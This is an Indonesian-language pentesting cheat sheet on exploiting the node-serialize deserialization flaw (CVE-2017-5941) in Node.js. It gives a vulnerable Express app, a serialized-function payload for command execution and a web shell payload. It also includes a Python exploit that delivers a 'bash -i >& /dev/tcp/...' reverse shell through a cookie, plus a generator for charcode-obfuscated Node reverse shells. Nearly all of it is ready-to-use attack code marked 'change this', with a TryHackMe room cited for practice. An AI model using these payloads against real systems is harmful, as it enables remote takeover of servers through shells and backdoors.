# Insecure Deserialization: NodeJS
type: #offensive #deserialization  #rce 
techniques: #rce #reverseshell #exfiltration 
target: #nodejs

## Node-Serialize (CVE-2017-5941)
Untrusted data yang dieksekusi oleh fungisi `unserialize()` dapat melakukan Remote Code Execution (RCE).

Vulnerable code:
```js
var express = require('express');
var cookieParser = require('cookie-parser');
var escape = require('escape-html');
var serialize = require('node-serialize');
var app = express();
app.use(cookieParser())
 
app.get('/', function(req, res) {
 if (req.cookies.profile) {
   var str = new Buffer(req.cookies.profile, 'base64').toString();
   var obj = serialize.unserialize(str);
   if (obj.username) {
     res.send("Hello " + escape(obj.username));
   }
 } else {
     res.cookie('profile', "eyJ1c2VybmFtZSI6ImFqaW4iLCJjb3VudHJ5IjoiaW5kaWEiLCJjaXR5IjoiYmFuZ2Fsb3JlIn0=", {
       maxAge: 900000,
       httpOnly: true
     });
 }
 res.send("Hello World");
});
app.listen(3000);
```

Reconnaissance code `recon.js`,  mencoba eksekusi `ls /` pada sistem operasi:
```js
var y = {
 rce : function(){
 require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) });
 },
}
var serialize = require('node-serialize');
console.log("Serialized: \n" + serialize.serialize(y));
```

Jika membutuhkan serialization, masukkan pada terminal
```sh
node recon.js

# output
{"rce":"_$$ND_FUNC$$_function (){\n \t require('child_process').exec('ls /',
function(error, stdout, stderr) { console.log(stdout) });\n }"}
```

Tambahkan ( ) diakhir pada hasil serialization tersebut untuk mengeksekusi code `ls /`. Serialization ini adalah final product untuk disubmit kepada target.
```sh
{"rce":"_$$ND_FUNC$$_function (){\n \t require('child_process').exec('ls /',
function(error, stdout, stderr) { console.log(stdout) });\n }()"}
```

### Eksploitasi 1: Membuat Web Shell
Code
```js
var serialize = require('node-serialize');
var payload = {
    "webShell" : "_$$ND_FUNC$$_function(){const http = require('http'); const url = require('url'); const ps  = require('child_process'); http.createServer(function (req, res) { var queryObject = url.parse(req.url,true).query; var cmd = queryObject['cmd']; try { ps.exec(cmd, function(error, stdout, stderr) { res.end(stdout); }); } catch (error) { return; }}).listen(443); }()"
    }
serialize.unserialize(serialize.serialize(payload))
```

Webshell
```sh
curl http://10.0.2.4:443?cmd=whoami

# output
nodeadmin
```

### Eksploitasi 2: Reverse Shell using Python
```python
import requests
import re
import base64
import sys

url = 'http://192.168.100.133:8000/' # change this

payload = ("require('http').ServerResponse.prototype.end = (function (end) {"
"return function () {"
"['close', 'connect', 'data', 'drain', 'end', 'error', 'lookup', 'timeout', ''].forEach(this.socket.removeAllListeners.bind(this.socket));"
"console.log('still inside');"
"const { exec } = require('child_process');"
"exec('bash -i >& /dev/tcp/192.168.200.5/445 0>&1');" # change this
"}"
"})(require('http').ServerResponse.prototype.end)")

# rce = "_$$ND_FUNC$$_process.exit(0)"
# code ="_$$ND_FUNC$$_console.log('behind you')"
code = "_$$ND_FUNC$$_" + payload

string = '{"username":"TheUndead","country":"worldwide","city":"Tyr", "exec": "'+code+'"}'

cookie = {'profile':base64.b64encode(string)}

try:
    response = requests.get(url, cookies=cookie).text
    print response
except requests.exceptions.RequestException as e:
    print('Oops!')
    sys.exit(1)
```

Opsi lain untuk reverse shell
https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py
```python
#!/usr/bin/python
# Generator for encoded NodeJS reverse shells
# Based on the NodeJS reverse shell by Evilpacket
# https://github.com/evilpacket/node-shells/blob/master/node_revshell.js
# Onelineified and suchlike by infodox (and felicity, who sat on the keyboard)
# Insecurety Research (2013) - insecurety.net
import sys

if len(sys.argv) != 3:
    print "Usage: %s <LHOST> <LPORT>" % (sys.argv[0])
    sys.exit(0)

IP_ADDR = sys.argv[1]
PORT = sys.argv[2]


def charencode(string):
    """String.CharCode"""
    encoded = ''
    for char in string:
        encoded = encoded + "," + str(ord(char))
    return encoded[1:]

print "[+] LHOST = %s" % (IP_ADDR)
print "[+] LPORT = %s" % (PORT)
NODEJS_REV_SHELL = '''
var net = require('net');
var spawn = require('child_process').spawn;
HOST="%s";
PORT="%s";
TIMEOUT="5000";
if (typeof String.prototype.contains === 'undefined') { String.prototype.contains = function(it) { return this.indexOf(it) != -1; }; }
function c(HOST,PORT) {
    var client = new net.Socket();
    client.connect(PORT, HOST, function() {
        var sh = spawn('/bin/sh',[]);
        client.write("Connected!\\n");
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
        sh.on('exit',function(code,signal){
          client.end("Disconnected!\\n");
        });
    });
    client.on('error', function(e) {
        setTimeout(c(HOST,PORT), TIMEOUT);
    });
}
c(HOST,PORT);
''' % (IP_ADDR, PORT)
print "[+] Encoding"
PAYLOAD = charencode(NODEJS_REV_SHELL)
print "eval(String.fromCharCode(%s))" % (PAYLOAD)
```

```sh
python nodejsshell.py 127.0.0.1 1337
```

### Referensi
https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/
https://www.cvedetails.com/cve/CVE-2017-5941/

Coba di:
https://tryhackme.com/room/jason